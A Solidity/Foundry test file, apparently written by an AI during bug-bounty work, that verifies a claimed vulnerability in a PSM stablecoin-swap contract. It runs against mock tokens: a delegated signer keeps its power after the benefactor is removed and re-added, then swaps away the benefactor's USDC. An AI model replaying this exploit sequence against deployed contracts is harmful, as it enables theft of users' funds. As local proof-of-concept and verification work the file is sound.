// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";
import {PSM} from "../src/PSM.sol";
import {IPSM} from "../src/IPSM.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "./MockERC20.sol";
import {MockOracleFeed} from "./MockOracleFeed.sol";

/// @title Independent verification test (NOT from agent, written by main AI)
/// @notice If this test PASSES, bug is REAL. If FAILS, bug is fake — do not submit.
contract IndependentVerifyTest is Test {
    PSM public psm;
    MockERC20 public usdtb;
    MockERC20 public usdc;
    MockOracleFeed public oracle;

    address public admin = makeAddr("admin");
    address public benefactor = makeAddr("benefactor");
    address public attacker = makeAddr("attacker");
    address public custodianRecv = makeAddr("custodianRecv");
    address public custodianSend = makeAddr("custodianSend");

    function setUp() public {
        vm.startPrank(admin);

        usdtb = new MockERC20("USDtb", "USDtb", 18);
        usdc = new MockERC20("USDC", "USDC", 6);
        oracle = new MockOracleFeed(1e18, block.timestamp);

        IPSM.GlobalConfig memory gc = IPSM.GlobalConfig({
            pegPrice: 1e18,
            epochDuration: 1 hours,
            periodDuration: 1 days,
            maxSwapForAssetPerEpoch: type(uint128).max,
            maxSwapForCollateralPerEpoch: type(uint128).max,
            maxSwapForAssetPerPeriod: type(uint128).max,
            maxSwapForCollateralPerPeriod: type(uint128).max,
            defaultBenefactorMaxSwapForAssetPerEpoch: type(uint128).max,
            defaultBenefactorMaxSwapForCollateralPerEpoch: type(uint128).max,
            defaultBenefactorMaxSwapForAssetPerPeriod: type(uint128).max,
            defaultBenefactorMaxSwapForCollateralPerPeriod: type(uint128).max
        });

        address[] memory epochManagers = new address[](1);
        epochManagers[0] = admin;
        address[] memory collateralManagers = new address[](1);
        collateralManagers[0] = admin;
        address[] memory benefactorManagers = new address[](1);
        benefactorManagers[0] = admin;
        address[] memory empty = new address[](0);

        psm = new PSM(
            address(usdtb),
            custodianSend,
            custodianRecv,
            gc,
            admin,
            epochManagers,
            empty,
            collateralManagers,
            empty,
            benefactorManagers,
            empty,
            empty
        );

        // Add USDC as collateral
        IPSM.CollateralConfig memory cc = IPSM.CollateralConfig({
            oracleFeed: address(oracle),
            decimals: 6,
            minOraclePrice: 0.99e18,
            maxOraclePrice: 1.01e18,
            maxOracleAge: 1 hours,
            receiveCustodianAddress: custodianRecv,
            sendCustodianAddress: custodianSend,
            defaultSwapForAssetFee: 0,
            defaultSwapForCollateralFee: 0,
            maxSwapForAssetPerEpoch: type(uint128).max,
            maxSwapForCollateralPerEpoch: type(uint128).max,
            maxSwapForAssetPerPeriod: type(uint128).max,
            maxSwapForCollateralPerPeriod: type(uint128).max,
            isActive: true
        });
        psm.addCollateral(address(usdc), cc);

        // Add benefactor
        psm.addBenefactor(benefactor);

        // Fund
        usdc.mint(benefactor, 100_000e6);
        usdtb.mint(custodianSend, 100_000e18);

        vm.stopPrank();

        vm.prank(custodianSend);
        usdtb.approve(address(psm), type(uint256).max);
    }

    function test_BugIsReal_AttackerDrainsAfterRemoveAndReAdd() public {
        // Step 1: benefactor delegates to attacker
        vm.prank(benefactor);
        psm.setDelegatedSigner(attacker);
        vm.prank(attacker);
        psm.confirmDelegatedSigner(benefactor);

        // Step 2: benefactor approves attacker as beneficiary
        vm.prank(benefactor);
        psm.setApprovedBeneficiary(attacker, true);

        // Step 3: benefactor approves PSM to spend USDC
        vm.prank(benefactor);
        usdc.approve(address(psm), type(uint256).max);

        // Step 4: admin REMOVES benefactor
        vm.prank(admin);
        psm.removeBenefactor(benefactor);

        // Step 5: admin RE-ADDS benefactor at SAME address
        vm.prank(admin);
        psm.addBenefactor(benefactor);

        // Step 6: attacker calls swap() as delegated signer
        IPSM.Order memory order = IPSM.Order({
            benefactor: benefactor,
            beneficiary: attacker,
            collateral: address(usdc),
            amountIn: 5000e6,
            minAmountOut: 4900e18,
            isSwapForAsset: true,
            nonce: 1,
            expiry: uint120(block.timestamp + 1 hours),
            chainId: block.chainid
        });

        uint256 attackerBefore = usdtb.balanceOf(attacker);
        uint256 benefactorBefore = usdc.balanceOf(benefactor);

        // ATTACK
        vm.prank(attacker);
        psm.swap(order);

        uint256 attackerAfter = usdtb.balanceOf(attacker);
        uint256 benefactorAfter = usdc.balanceOf(benefactor);

        // ASSERTIONS
        assertGt(attackerAfter, attackerBefore, "BUG FAKE: attacker should gain USDtb");
        assertLt(benefactorAfter, benefactorBefore, "BUG FAKE: benefactor should lose USDC");
        assertEq(attackerAfter - attackerBefore, 5000e18, "BUG FAKE: attacker gain mismatch");
        assertEq(benefactorBefore - benefactorAfter, 5000e6, "BUG FAKE: benefactor loss mismatch");
    }

    function test_Sanity_FreshBenefactorBlocks() public {
        address fresh = makeAddr("fresh");
        vm.prank(admin);
        psm.addBenefactor(fresh);

        vm.prank(fresh);
        usdc.approve(address(psm), type(uint256).max);
        usdc.mint(fresh, 10_000e6);

        IPSM.Order memory order = IPSM.Order({
            benefactor: fresh,
            beneficiary: attacker,
            collateral: address(usdc),
            amountIn: 1000e6,
            minAmountOut: 0,
            isSwapForAsset: true,
            nonce: 1,
            expiry: uint120(block.timestamp + 1 hours),
            chainId: block.chainid
        });

        vm.prank(attacker);
        vm.expectRevert();
        psm.swap(order);
    }
}
